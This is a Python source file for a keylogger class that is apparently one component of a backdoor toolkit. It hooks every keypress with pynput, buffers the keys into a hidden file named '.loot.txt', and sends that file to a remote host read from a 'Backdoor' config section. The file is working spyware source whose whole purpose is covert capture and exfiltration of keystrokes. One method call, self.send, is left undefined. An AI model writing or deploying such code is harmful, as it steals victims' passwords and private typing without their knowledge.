from pynput import keyboard
import encryption
import ConfigParser
from scapy.all import *
from fileUtils import FileTransfer


class Keylogger(object):
    def __init__(self, ftp):
        config = ConfigParser.ConfigParser()
        config.read('setup.config')

        self.remoteIP = config.get('Backdoor', 'remoteIP')
        self.remotePort = int(config.get ('Backdoor', 'remotePort'))
        self.localIP = config.get('Backdoor', 'localIP')
        self.localPort = int(config.get('Backdoor', 'localPort'))
        self.password = config.get('Encryption', 'password')

        self.listener = keyboard.Listener(on_press=self.onPress)
        self.savedFile = ".loot.txt"
        self.buffer = ""
        self.bufferSize = 8
        self.fileTransfer = ftp

    def onPress(self, key):
        try:
            keys = key.char
        except AttributeError:
            keys = '<' + str(key) + '>'

        self.send(keys)

    def start(self):
        if not self.listener.isAlive():
            self.listener = keyboard.Listener(on_press=self.onPress)
            self.listener.start()
            return True
        return False

    def stop(self):
        if self.listener.isAlive():
            self.listener.stop()
            return True
        return False

    def saveKey(self, keys):
        self.buffer += keys
        if len(self.buffer) < self.bufferSize:
            return
        else:
            with open(self.savedFile, "a") as savedFile:
                savedFile.write(self.buffer)
                self.buffer = ""
                self.fileTransfer.sendFile(self.savedFile)
